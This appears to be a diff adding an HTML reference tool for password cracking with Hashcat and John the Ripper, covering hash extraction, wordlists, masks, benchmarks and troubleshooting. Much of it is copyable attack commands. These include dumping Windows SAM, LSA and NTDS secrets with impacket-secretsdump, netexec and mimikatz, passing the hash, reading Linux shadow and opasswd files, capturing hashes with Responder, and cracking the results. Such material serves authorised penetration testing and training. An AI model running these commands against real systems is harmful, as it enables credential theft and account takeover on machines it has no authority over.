+        <tr><td class="tool">zip2john</td><td>ZIP archive</td><td class="cmd">zip2john file.zip > zip.hash</td><td>13600/17200</td></tr>
+        <tr><td class="tool">rar2john</td><td>RAR archive</td><td class="cmd">rar2john file.rar > rar.hash</td><td>13000/12500</td></tr>
+        <tr><td class="tool">7z2john.pl</td><td>7-Zip</td><td class="cmd">7z2john.pl file.7z > 7z.hash</td><td>11600</td></tr>
+        <tr><td class="tool">office2john.py</td><td>MS Office</td><td class="cmd">office2john.py file.docx > off.hash</td><td>9400-9600</td></tr>
+        <tr><td class="tool">pdf2john.py</td><td>PDF</td><td class="cmd">pdf2john.py file.pdf > pdf.hash</td><td>10400-10700</td></tr>
+        <tr><td class="tool">bitlocker2john</td><td>BitLocker VHD</td><td class="cmd">bitlocker2john -i disk.vhd > bl.hash</td><td>22100</td></tr>
+        <tr><td class="tool">gpg2john</td><td>GPG file</td><td class="cmd">gpg2john file.gpg > gpg.hash</td><td>17010</td></tr>
+        <tr><td class="tool">putty2john</td><td>PuTTY key</td><td class="cmd">putty2john key.ppk > putty.hash</td><td>15400</td></tr>
+        <tr><td class="tool">pfx2john</td><td>PKCS#12</td><td class="cmd">pfx2john cert.pfx > pfx.hash</td><td>--</td></tr>
+        <tr><td class="tool">wpapcap2john</td><td>WPA PCAP</td><td class="cmd">wpapcap2john file.pcap > wpa.hash</td><td>2500/22000</td></tr>
+        <tr><td class="tool">dmg2john</td><td>macOS DMG</td><td class="cmd">dmg2john file.dmg > dmg.hash</td><td>--</td></tr>
+        <tr><td class="tool">1password2john.py</td><td>1Password vault</td><td class="cmd">1password2john.py vault > 1p.hash</td><td>--</td></tr>
+        <tr><td class="tool">truecrypt_volume2john</td><td>TrueCrypt</td><td class="cmd">truecrypt_volume2john vol > tc.hash</td><td>6211-6243</td></tr>
+      </table>
+      <div class="info-box" style="margin-top:10px">After extracting with *2john, remove the filename prefix (e.g., "Database:") before feeding to Hashcat. JtR can use it as-is.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F5A5; Windows Hash Extraction</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">impacket-secretsdump 'DOMAIN/user:password@TARGET'</div><div class="payload-desc">Remote: Dump SAM + LSA + NTDS (domain admin required for NTDS)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">impacket-secretsdump -hashes :NTLMHASH Administrator@TARGET</div><div class="payload-desc">Remote with PtH</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">netexec smb TARGET -u USER -p PASS --sam</div><div class="payload-desc">Dump SAM via NetExec</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">netexec smb TARGET -u USER -p PASS --lsa</div><div class="payload-desc">Dump LSA secrets via NetExec</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">netexec smb TARGET -u USER -p PASS -M ntdsutil</div><div class="payload-desc">Dump NTDS.dit via NetExec</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">mimikatz # privilege::debug
+mimikatz # token::elevate
+mimikatz # lsadump::sam
+mimikatz # sekurlsa::logonpasswords</div><div class="payload-desc">Mimikatz: dump SAM + LSASS (local admin required)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">reg save HKLM\SAM sam.save && reg save HKLM\SYSTEM system.save && reg save HKLM\SECURITY security.save</div><div class="payload-desc">Save registry hives (local admin)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL</div><div class="payload-desc">Extract hashes from saved hives offline</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F427; Linux Hash Extraction</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">unshadow /etc/passwd /etc/shadow > unshadowed.hash</div><div class="payload-desc">Combine passwd + shadow for cracking</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">cat /etc/shadow | grep -v ':\*:\|:!:' | cut -d: -f1,2</div><div class="payload-desc">Extract only users with actual password hashes</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">sudo cat /etc/security/opasswd</div><div class="payload-desc">Read old password hashes (may contain weaker MD5 hashes)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: WORDLISTS ============= -->
+<div class="page" id="page-wordlists">
+  <div class="section-header">
+    <h1>&#x1F4D6; Wordlists & Rules</h1>
+    <p>Recommended wordlists, rule files, and custom wordlist generation.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4D6; Top Wordlists</div></div>
+    <div class="card-body">
+      <table class="ref-table">
+        <tr><th>Wordlist</th><th>Size</th><th>Best For</th></tr>
+        <tr><td class="cmd">/usr/share/wordlists/rockyou.txt</td><td>14M</td><td>First choice for everything. From 2009 RockYou breach.</td></tr>
+        <tr><td class="cmd">/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt</td><td>1M</td><td>Quick pass with most common passwords</td></tr>
+        <tr><td class="cmd">/usr/share/seclists/Passwords/Leaked-Databases/</td><td>varies</td><td>Various breach databases</td></tr>
+        <tr><td class="cmd">/usr/share/wordlists/fasttrack.txt</td><td>222</td><td>Quick check — top enterprise/default passwords</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4DD; Top Hashcat Rules</div></div>
+    <div class="card-body">
+      <table class="ref-table">
+        <tr><th>Rule File</th><th>Rules</th><th>Best For</th></tr>
+        <tr><td class="cmd">/usr/share/hashcat/rules/best64.rule</td><td>77</td><td>Quick first pass — most effective mutations</td></tr>
+        <tr><td class="cmd">/usr/share/hashcat/rules/rockyou-30000.rule</td><td>30,000</td><td>Best with rockyou.txt — designed together</td></tr>
+        <tr><td class="cmd">/usr/share/hashcat/rules/d3ad0ne.rule</td><td>~34,000</td><td>Comprehensive mutations</td></tr>
+        <tr><td class="cmd">/usr/share/hashcat/rules/dive.rule</td><td>~99,000</td><td>Maximum coverage (slow but thorough)</td></tr>
+        <tr><td class="cmd">/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule</td><td>~3,200</td><td>Professional password patterns</td></tr>
+        <tr><td class="cmd">/usr/share/hashcat/rules/leetspeak.rule</td><td>~35</td><td>Leet speak substitutions only</td></tr>
+        <tr><td class="cmd">/usr/share/hashcat/rules/toggles1.rule</td><td>15</td><td>Case toggle variations</td></tr>
+        <tr><td class="cmd">/usr/share/hashcat/rules/OneRuleToRuleThemAll.rule</td><td>~52,000</td><td>Community favorite — optimized for real passwords</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F310; Custom Wordlist Generation</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">cewl https://www.target.com -d 4 -m 6 --lowercase -w target.wordlist</div><div class="payload-desc">CeWL: Spider website, min 6 chars, depth 4</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">./username-anarchy -i names.txt</div><div class="payload-desc">Generate username permutations from real names</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat --force password.list -r custom.rule --stdout | sort -u > mutated.txt</div><div class="payload-desc">Apply rules to wordlist to create expanded list</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</div><div class="payload-desc">Decompress rockyou.txt on fresh Kali install</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F525; Rule Function Quick Reference</div></div>
+    <div class="card-body">
+      <table class="ref-table">
+        <tr><th>Function</th><th>Description</th><th>Example: "password"</th></tr>
+        <tr><td class="cmd">c</td><td>Capitalize first, lower rest</td><td>Password</td></tr>
+        <tr><td class="cmd">u</td><td>Uppercase all</td><td>PASSWORD</td></tr>
+        <tr><td class="cmd">l</td><td>Lowercase all</td><td>password</td></tr>
+        <tr><td class="cmd">$1</td><td>Append "1"</td><td>password1</td></tr>
+        <tr><td class="cmd">^1</td><td>Prepend "1"</td><td>1password</td></tr>
+        <tr><td class="cmd">so0</td><td>Replace o with 0</td><td>passw0rd</td></tr>
+        <tr><td class="cmd">sa@</td><td>Replace a with @</td><td>p@ssword</td></tr>
+        <tr><td class="cmd">d</td><td>Duplicate</td><td>passwordpassword</td></tr>
+        <tr><td class="cmd">r</td><td>Reverse</td><td>drowssap</td></tr>
+      </table>
+      <div class="info-box" style="margin-top:8px"><strong>Common patterns:</strong> c $1 $! = Password1! | c so0 sa@ $! = P@ssw0rd! | c $2 $0 $2 $4 $! = Password2024!</div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: MASKS ============= -->
+<div class="page" id="page-masks">
+  <div class="section-header">
+    <h1>&#x1F3AD; Mask Builder</h1>
+    <p>Build custom masks for targeted brute-force attacks.</p>
+  </div>
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4CB; Character Sets</div></div>
+    <div class="card-body">
+      <table class="ref-table">
+        <tr><th>Symbol</th><th>Charset</th><th>Count</th></tr>
+        <tr><td class="cmd">?l</td><td>abcdefghijklmnopqrstuvwxyz</td><td>26</td></tr>
+        <tr><td class="cmd">?u</td><td>ABCDEFGHIJKLMNOPQRSTUVWXYZ</td><td>26</td></tr>
+        <tr><td class="cmd">?d</td><td>0123456789</td><td>10</td></tr>
+        <tr><td class="cmd">?s</td><td>space!"#$%&'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~</td><td>33</td></tr>
+        <tr><td class="cmd">?a</td><td>?l?u?d?s (all printable)</td><td>95</td></tr>
+        <tr><td class="cmd">?h</td><td>0123456789abcdef</td><td>16</td></tr>
+      </table>
+    </div>
+  </div>
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F3AD; Common Mask Patterns</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">hashcat -a 3 -m MODE hash.txt '?u?l?l?l?l?l?d?d'</div><div class="payload-desc">Ullllldd (Password12) — 8 chars</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -a 3 -m MODE hash.txt '?u?l?l?l?l?l?l?d?d?s'</div><div class="payload-desc">Ulllllldd! (Sunshine99!) — 10 chars</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -a 3 -m MODE hash.txt -1 '!@#$%' '?u?l?l?l?l?d?d?1'</div><div class="payload-desc">Custom charset for special chars</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -a 3 -m MODE hash.txt '?d?d?d?d?d?d' --increment --increment-min=4</div><div class="payload-desc">Incremental PIN: 4-6 digits</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -a 3 -m MODE hash.txt '?u?l?l?l?l?l?l?l?d?d?d?d?s' --increment --increment-min=8</div><div class="payload-desc">Enterprise: 8-13 chars incremental</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x2699;&#xFE0F; Interactive Mask Generator</div><span class="tag tag-green">INTERACTIVE</span></div>
+    <div class="card-body">
+      <div class="form-grid-4">
+        <div class="form-row"><div class="label">Hashcat Mode</div><input class="input" id="mask-mode" placeholder="1000" value="1000"></div>
+        <div class="form-row"><div class="label">Hash File</div><input class="input" id="mask-file" placeholder="hash.txt" value="hash.txt"></div>
+        <div class="form-row"><div class="label">Min Length</div><input class="input" id="mask-min" type="number" value="8" min="1" max="20"></div>
+        <div class="form-row"><div class="label">Max Length</div><input class="input" id="mask-max" type="number" value="10" min="1" max="20"></div>
+      </div>
+      <div class="form-grid-4">
+        <div class="form-row"><label style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="mask-upper" checked><span style="color:var(--text2);font-size:12px">Uppercase (A-Z)</span></label></div>
+        <div class="form-row"><label style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="mask-lower" checked><span style="color:var(--text2);font-size:12px">Lowercase (a-z)</span></label></div>
+        <div class="form-row"><label style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="mask-digit" checked><span style="color:var(--text2);font-size:12px">Digits (0-9)</span></label></div>
+        <div class="form-row"><label style="display:flex;align-items:center;gap:6px;cursor:pointer"><input type="checkbox" id="mask-special"><span style="color:var(--text2);font-size:12px">Special chars</span></label></div>
+      </div>
+      <button class="btn btn-green" onclick="genMask()">&#x26A1; Generate Mask Command</button>
+      <div class="gen-output" id="mask-output" style="display:none"><button class="btn btn-copy copy-gen" onclick="copyEl('mask-output')">&#x1F4CB; Copy</button></div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: BENCHMARK ============= -->
+<div class="page" id="page-benchmark">
+  <div class="section-header">
+    <h1>&#x1F4CA; Benchmark Reference</h1>
+    <p>GPU vs CPU hash rates and cracking time estimates.</p>
+  </div>
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4CA; GPU vs CPU Hash Rates</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">hashcat -b</div><div class="payload-desc">Run full benchmark on your hardware</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <table class="ref-table" style="margin-top:10px">
+        <tr><th>Algorithm</th><th>Mode</th><th>GPU (RTX 3090)</th><th>CPU (i9)</th><th>Difficulty</th></tr>
+        <tr><td>NTLM</td><td class="cmd">1000</td><td>~100 GH/s</td><td>~18 MH/s</td><td class="cmd" style="color:var(--green)">EASY</td></tr>
+        <tr><td>MD5</td><td class="cmd">0</td><td>68 GH/s</td><td>450 MH/s</td><td class="cmd" style="color:var(--green)">EASY</td></tr>
+        <tr><td>SHA-1</td><td class="cmd">100</td><td>21 GH/s</td><td>298 MH/s</td><td class="cmd" style="color:var(--green)">EASY</td></tr>
+        <tr><td>SHA-256</td><td class="cmd">1400</td><td>9.3 GH/s</td><td>134 MH/s</td><td class="cmd" style="color:var(--green)">EASY</td></tr>
+        <tr><td>Net-NTLMv2</td><td class="cmd">5600</td><td>~6 GH/s</td><td>~3.5 MH/s</td><td class="cmd" style="color:var(--amber)">MEDIUM</td></tr>
+        <tr><td>Kerberoast RC4</td><td class="cmd">13100</td><td>~1.2 GH/s</td><td>~1.5 MH/s</td><td class="cmd" style="color:var(--amber)">MEDIUM</td></tr>
+        <tr><td>WordPress</td><td class="cmd">400</td><td>~32 MH/s</td><td>~200 KH/s</td><td class="cmd" style="color:var(--amber)">MEDIUM</td></tr>
+        <tr><td>sha512crypt</td><td class="cmd">1800</td><td>~3 MH/s</td><td>~400 KH/s</td><td class="cmd" style="color:var(--orange)">SLOW</td></tr>
+        <tr><td>bcrypt</td><td class="cmd">3200</td><td>~105 KH/s</td><td>~15 KH/s</td><td class="cmd" style="color:var(--red)">VERY SLOW</td></tr>
+        <tr><td>DCC2</td><td class="cmd">2100</td><td>~250 KH/s</td><td>~5.5 KH/s</td><td class="cmd" style="color:var(--red)">VERY SLOW</td></tr>
+        <tr><td>KeePass</td><td class="cmd">13400</td><td>~170 KH/s</td><td>~3 KH/s</td><td class="cmd" style="color:var(--red)">VERY SLOW</td></tr>
+        <tr><td>BitLocker</td><td class="cmd">22100</td><td>~9 KH/s</td><td>~25 H/s</td><td class="cmd" style="color:var(--red)">EXTREME</td></tr>
+      </table>
+      <div class="info-box" style="margin-top:10px">GH/s = Billion. MH/s = Million. KH/s = Thousand. For slow hashes, use smaller targeted wordlists + smart rules instead of brute-force.</div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x23F1; Cracking Time Calculator</div><span class="tag tag-green">INTERACTIVE</span></div>
+    <div class="card-body">
+      <div class="form-grid-3">
+        <div class="form-row"><div class="label">Charset</div><select class="select" id="tc-charset" onchange="calcTime()">
+          <option value="26">Lowercase (a-z) = 26</option>
+          <option value="52">Upper + Lower = 52</option>
+          <option value="62" selected>Upper + Lower + Digits = 62</option>
+          <option value="72">+ Common specials = 72</option>
+          <option value="95">All printable ASCII = 95</option>
+          <option value="10">Digits only (PIN) = 10</option>
+        </select></div>
+        <div class="form-row"><div class="label">Password Length</div><input class="input" id="tc-length" type="number" value="8" min="1" max="20" onchange="calcTime()"></div>
+        <div class="form-row"><div class="label">Hash Rate (H/s)</div><select class="select" id="tc-rate" onchange="calcTime()">
+          <option value="100000000000" selected>NTLM GPU RTX3090 (~100 GH/s)</option>
+          <option value="68185100000">MD5 GPU (~68 GH/s)</option>
+          <option value="9276300000">SHA256 GPU (~9.3 GH/s)</option>
+          <option value="1200000000">Kerberoast GPU (~1.2 GH/s)</option>
+          <option value="3000000">sha512crypt GPU (~3 MH/s)</option>
+          <option value="105000">bcrypt GPU (~105 KH/s)</option>
+          <option value="250000">DCC2 GPU (~250 KH/s)</option>
+          <option value="9000">BitLocker GPU (~9 KH/s)</option>
+        </select></div>
+      </div>
+      <div class="gen-output" id="tc-output">Calculating...</div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: TROUBLESHOOT ============= -->
+<div class="page" id="page-troubleshoot">
+  <div class="section-header">
+    <h1>&#x1F527; Troubleshooting</h1>
+    <p>Common errors, fixes, and tips for successful hash cracking.</p>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x26A0;&#xFE0F; "No hashes loaded" / "Token length exception"</div><span class="tag tag-red">MOST COMMON</span></div>
+    <div class="card-body">
+      <div class="step-list">
+        <div class="step"><div class="step-num">1</div><div class="step-content"><div class="step-title">Wrong Hashcat mode (-m)</div><div class="step-body">Verify your hash type with: hashid -m 'HASH' or nth --text 'HASH'</div></div></div>
+        <div class="step"><div class="step-num">2</div><div class="step-content"><div class="step-title">Windows CRLF line endings</div><div class="step-body">Fix: sed -i 's/\r//' hash.txt — Always run after copy-pasting from Windows</div></div></div>
+        <div class="step"><div class="step-num">3</div><div class="step-content"><div class="step-title">Filename prefix from *2john tools</div><div class="step-body">Fix: sed -i 's/^Database://' hash.txt — Remove prefixes like "Database:", "id_rsa:", etc.</div></div></div>
+        <div class="step"><div class="step-num">4</div><div class="step-content"><div class="step-title">Leading asterisk in MySQL hashes</div><div class="step-body">Fix: sed 's/^\*//' mysql.hash > clean.hash</div></div></div>
+        <div class="step"><div class="step-num">5</div><div class="step-content"><div class="step-title">BOM (Byte Order Mark) in file</div><div class="step-body">Fix: sed -i '1s/^\xEF\xBB\xBF//' hash.txt — Check with: cat hash.txt | xxd | head</div></div></div>
+      </div>
+      <div class="payload-item"><div><div class="payload-code">cat hash.txt | xxd | head</div><div class="payload-desc">Inspect raw hex to find invisible characters</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">sed -i 's/\r//' hash.txt</div><div class="payload-desc">Fix CRLF line endings</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x26A0;&#xFE0F; Hashcat silently fails on secretsdump output</div></div>
+    <div class="card-body">
+      <div class="info-box danger"><strong>#1 Mistake:</strong> Running hashcat -m 1000 secretsdump.txt without --username flag. Hashcat fails SILENTLY — reports 0 cracked when the file has user:RID:LM:NT format.</div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 1000 secretsdump.txt rockyou.txt --username</div><div class="payload-desc">CORRECT: Must use --username for secretsdump format</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">cat secretsdump.txt | cut -d: -f4 | sort -u > ntlm_only.txt</div><div class="payload-desc">Alternative: Extract NTLM hashes only (field 4)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-header"><div class="card-title">&#x1F4A1; Pro Tips</div></div>
+    <div class="card-body">
+      <div class="payload-item"><div><div class="payload-code">hashcat -m 1000 remaining.txt cracked_passwords.txt -r best64.rule</div><div class="payload-desc">Use previously cracked passwords as wordlist — AD users share patterns</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">grep -v "history" secretsdump.txt > current_only.txt</div><div class="payload-desc">Remove _history entries to reduce noise</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m MODE hash.txt --show</div><div class="payload-desc">Show already-cracked results from potfile</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m MODE hash.txt --show --username</div><div class="payload-desc">Show cracked with usernames</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat --potfile-path /dev/null -m MODE hash.txt rockyou.txt</div><div class="payload-desc">Ignore potfile (re-crack previously cracked hashes)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      <div class="payload-item"><div><div class="payload-code">hashcat -m MODE hash.txt -w 3 rockyou.txt</div><div class="payload-desc">Workload profile 3 (high performance, system may lag)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+    </div>
+  </div>
+</div>
+
+<!-- ============= PAGE: CHEATSHEET ============= -->
+<div class="page" id="page-cheatsheet">
+  <div class="section-header">
+    <h1>&#x1F4D6; Quick Cheat Sheet</h1>
+    <p>One-page reference for Hashcat and JtR.</p>
+  </div>
+  <div class="grid-2">
+    <div class="card">
+      <div class="card-header"><div class="card-title">&#x1F528; Hashcat Essential Commands</div></div>
+      <div class="card-body">
+        <div class="payload-item"><div><div class="payload-code">hashcat -m MODE hash.txt wordlist.txt</div><div class="payload-desc">Basic dictionary</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">hashcat -m MODE hash.txt wordlist.txt -r rules.rule</div><div class="payload-desc">Dictionary + rules</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">hashcat -a 3 -m MODE hash.txt '?u?l?l?l?d?s'</div><div class="payload-desc">Mask attack</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">hashcat -a 1 -m MODE hash.txt w1.txt w2.txt</div><div class="payload-desc">Combinator</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">hashcat -a 6 -m MODE hash.txt wordlist.txt '?d?d?s'</div><div class="payload-desc">Hybrid: word + mask</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">hashcat -m MODE hash.txt --show</div><div class="payload-desc">Show cracked</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">hashcat -b</div><div class="payload-desc">Benchmark all modes</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">hashcat --identify hash.txt</div><div class="payload-desc">Identify hash type (v6.2.5+)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      </div>
+    </div>
+    <div class="card">
+      <div class="card-header"><div class="card-title">&#x1F529; John the Ripper Essential Commands</div></div>
+      <div class="card-body">
+        <div class="payload-item"><div><div class="payload-code">john --wordlist=rockyou.txt hash.txt</div><div class="payload-desc">Dictionary attack (auto-detect format)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">john --wordlist=rockyou.txt --rules=best64 hash.txt</div><div class="payload-desc">Dictionary + rules</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">john --single hash.txt</div><div class="payload-desc">Single crack mode (uses usernames)</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">john --incremental hash.txt</div><div class="payload-desc">Incremental brute-force</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">john --format=FORMAT --wordlist=rockyou.txt hash.txt</div><div class="payload-desc">Force specific format</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">john --show hash.txt</div><div class="payload-desc">Show cracked</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">john --list=formats | grep -i keyword</div><div class="payload-desc">Search supported formats</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+        <div class="payload-item"><div><div class="payload-code">john --list=rules</div><div class="payload-desc">List available rule sets</div></div><div class="payload-actions"><button class="btn btn-copy" onclick="copyPayload(this)">&#x1F4CB;</button></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+</div><!-- /main -->
+</div><!-- /app -->
+
+<div id="notif-container"></div>
+
+<script>
+/* ═══════════════════════════════════════════════
+   HASH DATABASE — The Oracle Knowledge Base
+   ═══════════════════════════════════════════════ */
+const HASH_DB = {
+  'ntlm':         {name:'NTLM (Windows)',hc:1000,jtr:'nt',speed:'FAST',extract:'impacket-secretsdump / mimikatz lsadump::sam / netexec --sam',example:'32 hex chars (e.g. 5f4dcc3b5aa765d61d8327deb882cf99)',tips:'NOT salted. --username flag required for secretsdump format. Fastest hash to crack.'},
+  'ntlmv2':       {name:'Net-NTLMv2 (Responder)',hc:5600,jtr:'netntlmv2',speed:'MEDIUM',extract:'Responder: sudo responder -I tun0',example:'user::DOMAIN:challenge:response:blob',tips:'CANNOT be used for PtH — must crack. Save entire Responder output line.'},
+  'ntlmv1':       {name:'Net-NTLMv1',hc:5500,jtr:'netntlm',speed:'MEDIUM',extract:'Responder with --lm flag',example:'user::DOMAIN:LM:NTLM:challenge',tips:'Weaker than NTLMv2. Can be cracked via rainbow tables at crack.sh.'},
+  'lm':           {name:'LM Hash (Legacy)',hc:3000,jtr:'lm',speed:'FAST',extract:'secretsdump (field 3, ignore aad3b435...)',example:'16 hex chars per half',tips:'Splits password into 7-char halves. Max 14 chars. aad3b435... = empty half.'},
+  'dcc1':         {name:'Domain Cached Creds v1',hc:1100,jtr:'mscach',speed:'FAST',extract:'secretsdump -history or mimikatz lsadump::cache',example:'hash:username',tips:'Older Windows. v2 (DCC2) is much more common now.'},
+  'dcc2':         {name:'Domain Cached Creds v2 (DCC2)',hc:2100,jtr:'mscach2',speed:'VERY SLOW',extract:'secretsdump -history or mimikatz lsadump::cache',example:'$DCC2$10240#user#hash',tips:'PBKDF2-based, extremely slow. Use small targeted wordlists.'},
